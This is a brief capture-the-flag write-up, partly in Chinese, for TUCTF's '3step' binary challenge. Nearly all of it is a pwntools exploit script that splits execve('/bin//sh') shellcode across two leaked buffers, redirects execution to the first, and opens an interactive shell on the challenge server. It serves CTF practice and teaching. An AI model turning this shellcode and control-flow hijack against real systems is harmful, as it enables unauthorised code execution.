### 3step

> [附件](./3step)

程序给了两个buffer，分别给了地址，可以将shellcode分成两部分

[Exploit script:](./3.py)

```python
#!/usr/bin/env python
from pwn import *
context.log_level='debug'
p = remote('chal.tuctf.com',30504)
#p = process('./3step')

p.recvuntil('snacks\n')
buf1=int(p.recvline(),16)
buf2 = int(p.recvline(),16)

shellcode1 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68"

shellcode1 += "\xbe"+p32(buf2)+'\xff\xe6'

shellcode2 = "\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"



p.recvuntil('1: ')
#gdb.attach(p)
p.sendline(shellcode1)
p.recvuntil('2: ')
p.sendline(shellcode2)
p.recvuntil('3: ')
p.sendline(p32(buf1))

p.interactive()
```

